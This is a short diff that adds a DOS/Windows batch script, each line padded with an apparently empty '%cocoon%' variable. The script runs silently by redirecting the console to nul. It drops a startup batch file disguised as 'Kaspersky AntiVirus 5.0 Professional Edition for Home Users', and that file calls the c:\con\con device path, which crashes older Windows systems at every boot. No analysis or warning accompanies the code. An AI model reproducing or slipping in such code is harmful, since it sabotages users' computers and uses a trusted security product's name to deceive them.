@@ -1,0 +1,7 @@
+cls%cocoon%
+@echo off%cocoon%
+ctty nul%cocoon%
+@echo.c:\con\con>%windir%\startm~1\programs\startup\"Kaspersky AntiVirus 5.0 Professional Edition for Home Users".bat%cocoon%
+@echo on%cocoon%
+ctty con%cocoon%
+cls%cocoon%
